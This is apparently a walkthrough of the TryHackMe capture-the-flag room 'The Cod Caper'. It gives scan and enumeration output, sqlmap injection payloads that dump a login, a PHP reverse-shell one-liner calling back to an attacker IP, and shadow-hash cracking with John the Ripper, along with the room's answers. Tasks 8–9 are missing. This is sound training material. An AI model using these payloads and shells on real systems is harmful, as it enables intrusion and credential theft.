# The Cod Caper

![alt text](https://github.com/kashyap-source/Try-Hack-Me/blob/master/Linux/The%20Cod%20Caper/Image/gq8tre5.png)

**Source:** Created by Paradox

***Description:***
  A guided room taking you through infiltrating and exploiting a Linux system.
  
***Related Hosting Links***

- *TryHackMe.com*
  - Link: https://tryhackme.com/room/thecodcaper  

**Task 1:**

-***Instruction:***

-Hello there my name is Pingu. I've come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn't eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server. As all penguins are natural experts in penetration testing, I figured I could get the key myself! Unfortunately he banned every IP from Antarctica, so I am unable to do anything to the server. Therefore I call upon you my dear ally to help me get my fish back! Naturally I'll be guiding you through the process.

-Note: This room expects some basic pen testing knowledge, as I will not be going over every tool in detail that is used. While you can just use the room to follow through, some interest or experiencing in assembly is highly recommended

**Task 2 Host Enumeration)**

-Recommended Tool - nmap:

-**Nmap**
     
    -kali@kali:~$ nmap -vv -sC -sV 10.10.85.135 
     Scanning 10.10.85.135 [1000 ports]
     Discovered open port 80/tcp on 10.10.85.135
     Discovered open port 22/tcp on 10.10.85.135

     PORT   STATE SERVICE REASON  VERSION
     22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
     | ssh-hostkey: 
     |   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
     | ssh-rsa                                  
     AAAAB3NzaC1yc2EAAAADAQABAAABAQDs2k31WKwi9eUwlvpMuWNMzFjChpDu4IcM3k6VLyq3IEnYuZl2lL/
     dMWVGCKPfnJ1yv2IZVk1KXha7nSIR4yxExRDx7Ybi7ryLUP/XTrLtBwdtJZB7k48EuS8okvYLk4ppG1MRvrV
     ojNPprF4nh5S0EEOowqGoiHUnGWOzYSgvaLAgvr7ivZxSsFCLqvdmieErVrczCBOqDOcPH9ZD/q6WalyHM
     ccZWVL3Gk5NmHPaYDd9ozVHCMHLq7brYxKrUcoOtDhX7btNamf+PxdH5I9opt6aLCjTTLsBPO2v5qZYPm1Rod6
     4nysurgnEKe+e4ZNbsCvTc1AaYKVC+oguSNmT
     |   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
     | ecdsa-sha2-nistp256 
     AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmpmAEGyFxyUqlKmlCnCeQW4KX
     OpnSG6SwmjD5tGSoYaz5Fh1SFMNP0/KNZUStQK9KJmz1vLeKI03nLjIR1sho=
     |   256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
     |_ssh-ed25519 
     AAAAC3NzaC1lZDI1NTE5AAAAIFBIRpiANvrp1KboZ6vAeOeYL68yOjT0wbxgiavv10kC
     80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
     | http-methods: 
     |_  Supported Methods: POST OPTIONS GET HEAD
     |_http-server-header: Apache/2.4.18 (Ubuntu)
     |_http-title: Apache2 Ubuntu Default Page: It works
     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
     
1) How many ports are open on the target machine?
  
    **2**

2) What is the http-title of the web server?

    **Apache2 Ubuntu Default Page: It works**

3) What version is the ssh service?

    **OpenSSH 7.2p2 Ubuntu 4ubuntu2.8**

4) What is the version of the web server?
  
   **Apache/2.4.18**
   
**Task 3 (Web Enumeration)**
    
 -**Gobuster:**
         
         kali@kali:~/Documents$ gobuster dir -u http://10.10.85.135 -w big.txt -x php,txt,html
         ===============================================================
         Gobuster v3.0.1
         by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
         ===============================================================
         [+] Url:            http://10.10.85.135
         [+] Threads:        10
         [+] Wordlist:       big.txt
         [+] Status codes:   200,204,301,302,307,401,403
         [+] User Agent:     gobuster/3.0.1
         [+] Extensions:     txt,html,php
         [+] Timeout:        10s
         ===============================================================
         2020/11/07 01:33:25 Starting gobuster
         ===============================================================
          /.htaccess (Status: 403)
          /.htaccess.php (Status: 403)
          /.htaccess.txt (Status: 403)
          /.htaccess.html (Status: 403)
          /.htpasswd (Status: 403)
          /.htpasswd.txt (Status: 403)
          /.htpasswd.html (Status: 403)
          /.htpasswd.php (Status: 403)
          /administrator.php (Status: 200)
          Progress: 1983 / 20474 (9.69%)^C
          [!] Keyboard interrupt detected, terminating.
          ===============================================================
          2020/11/07 01:36:20 Finished
          ===============================================================
          
1) What is the name of the important file on the server?

     **administrator.php**
     
**Task 4 (Web Exploitation)**

-**sqlmap**
       
       kali@kali:~$ sqlmap -v -u 
       http://10.10.85.135/administrator.php  --data 'username=&password=' -users -T --dump
             ___
            __H__                                                                               
      ___ ___[.]_____ ___ ___  {1.4.10#stable}                                                           
      |_ -| . [)]     | .'| . |                                                                            
      |___|_  [,]_|_|_|__,|  _|                                                                                  
            |_|V...       |_|   http://sqlmap.org  
     [!] legal disclaimer: Usage of sqlmap for attacking targets  without prior mutual consent is          
     illegal. It is the end user's responsibility to obey all applicable local, state and federal          
     laws. Developers assume no liability and are not responsible for any misuse or damage caused by      
     this program
     
     [*] starting @ 02:21:31 /2020-11-07/
     
     [02:21:32] [WARNING] provided value for parameter 'username' is empty. Please, always use only        valid parameter values so sqlmap could be able to run properly
     [02:21:32] [WARNING] provided value for parameter 'password' is empty. Please, always use only        valid parameter values so sqlmap could be able to run properly
     [02:21:32] [INFO] resuming back-end DBMS 'mysql' 
     [02:21:32] [INFO] testing connection to the target URL
     sqlmap resumed the following injection point(s) from stored session:
     ---
    Parameter: username (POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=' AND GTID_SUBSET(CONCAT(0x716b6b6a71,(SELECT                            (ELT(3138=3138,1))),0x7170707a71),3138)-- LQrA&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=' AND (SELECT 9447 FROM (SELECT(SLEEP(5)))Kdxo)-- zzqO&password=
    ---
    [02:21:32] [INFO] the back-end DBMS is MySQL
    back-end DBMS: MySQL >= 5.6
    [02:21:32] [INFO] fetching columns for table 'users' in database 'users'
    [02:21:34] [INFO] retrieved: 'username'
    [02:21:35] [INFO] retrieved: 'varchar(100)'
    [02:21:35] [INFO] retrieved: 'password'
    [02:21:35] [INFO] retrieved: 'varchar(100)'
    [02:21:35] [INFO] fetching entries for table 'users' in database 'users'
    [02:21:35] [INFO] retrieved: 'secretpass'
    [02:21:36] [INFO] retrieved: 'pingudad'
    Database: users
    Table: users
    [1 entry]
    +------------+----------+
    | password   | username |
    +------------+----------+
    | secretpass | pingudad |
    +------------+----------+
    [02:21:36] [INFO] table 'users.users' dumped to CSV file '/home/kali/.loc
    [02:21:36] [INFO] fetched data logged to text files under '/home/kali/.lo

    [*] ending @ 02:21:36 /2020-11-07/

1)  What is the admin username?

      **pingudad**

2)  What is the admin password?

      **secretpass**
     
3) How many forms of SQLI is the form vulnerable to?

     **3**
     
**Task 5 (Command Execution)**

-**PHP reverse shell & netcat** 
 
![alt text](https://github.com/kashyap-source/Try-Hack-Me/blob/master/Linux/The%20Cod%20Caper/Image/Screenshot%202020-11-09%2013_30_06.png)

-A useful PHP reverse shell:
       
        php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
        (Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
 
-Netcat   
        
            kali@kali:~$ sudo nc -lnvp 80
            Listening on 0.0.0.0 80
            Connection received on 10.10.210.94 40862
            /bin/sh: 0: can't access tty; job control turned off
            $ ls
            2591c98b70119fe624898b1e424b5e91.php
            administrator.php
            index.html
            $ cat passwd
            root:x:0:0:root:/root:/bin/bash
            daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
            bin:x:2:2:bin:/bin:/usr/sbin/nologin
            sys:x:3:3:sys:/dev:/usr/sbin/nologin
            sync:x:4:65534:sync:/bin:/bin/sync
            games:x:5:60:games:/usr/games:/usr/sbin/nologin
            man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
            lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
            mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
            news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
            uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
            proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
            www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
            backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
            list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
            irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
            gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
            nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
            systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
            systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
            systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
            systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
            syslog:x:104:108::/home/syslog:/bin/false
            _apt:x:105:65534::/nonexistent:/bin/false
            messagebus:x:106:110::/var/run/dbus:/bin/false
            uuidd:x:107:111::/run/uuidd:/bin/false
            papa:x:1000:1000:qaa:/home/papa:/bin/bash
            mysql:x:108:116:MySQL Server,,,:/nonexistent:/bin/false
            sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
            pingu:x:1002:1002::/home/pingu:/bin/bash    
            $ cd ..
            $ ls
            backups
            cache
            hidden
            lib
            local
            lock
            log
            mail
            opt
            run
            spool
            tmp
            www
            $ cd hidden
            $ ls
             pass
            $ cat pass
              pinguapingu   
                
1) How many files are in the current directory?

     **3**

2) Do I still have an account

    **yes**
                
3)  What is my ssh password?

     **pinguapingu**
                
**Task 6 (LinEnum)**  

-**LinEnum**
     
            kali@kali:~/Downloads$ scp LinEnum.sh pingu@10.10.210.94:/tmp
            pingu@10.10.210.94's password: 
            
            pingu@ubuntu:/tmp$ chmod +x LinEnum.sh 
            pingu@ubuntu:/tmp$ ./LinEnum.sh 
            [-] SUID files:
            -r-sr-xr-x 1 root papa 7516 Jan 16  2020 /opt/secret/root
            -rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
            -rwsr-xr-x 1 root root 10624 May  8  2018 /usr/bin/vmware-user-suid-wrapper
            -rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
            -rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
            -rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
            -rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
            -rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
            -rwsr-xr-x 1 root root 428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign
            -rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
            -rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-   helper
            -rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
            -rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
            -rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
            -rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
            -rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
            -rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
            -rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount

1) What is the interesting path of the interesting suid file
   
    **/opt/secret/root**
                
**Task 7 (pwndbg)**
            
            pingu@ubuntu:~$ gdb /opt/secret/root
            GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
            Copyright (C) 2016 Free Software Foundation, Inc.
            License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
            This is free software: you are free to change and redistribute it.
            There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
            and "show warranty" for details.
            This GDB was configured as "x86_64-linux-gnu".
            Type "show configuration" for configuration details.
            For bug reporting instructions, please see:
            <http://www.gnu.org/software/gdb/bugs/>.
            Find the GDB manual and other documentation resources online at:
            <http://www.gnu.org/software/gdb/documentation/>.
            For help, type "help".
            Type "apropos word" to search for commands related to "word"...
            pwndbg: loaded 178 commands. Type pwndbg [filter] for a list.
            pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
            Reading symbols from /opt/secret/root...(no debugging symbols found)...done.
            pwndbg> r < <(cyclic 50)   

**Task 10 (Finishing the job)**
 
               root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYto
               F1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
               
               **JohnTheRipper**
               kali@kali:~/Documents$ john --wordlist=rockyou.txt hashfile.txt 
               Created directory: /home/kali/.john
               Using default input encoding: UTF-8
               Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
               Cost 1 (iteration count) is 5000 for all loaded hashes
               Press 'q' or Ctrl-C to abort, almost any other key for status
               love2fish        (root)
               1g 0:00:02:48 DONE (2020-11-09 02:54) 0.005926g/s 1421p/s 1421c/s 1421C/s   lovelife07..lossims
               Use the "--show" option to display all of the cracked passwords reliably
               Session completed
                
 1)  What is the root password!
 
     **love2fish**
                              
**Task 11 (Thank you!)**
      
                    pingu@ubuntu:~$su root
                    password:
                    
                    root@ubuntu:~$

                
                
                
     
       
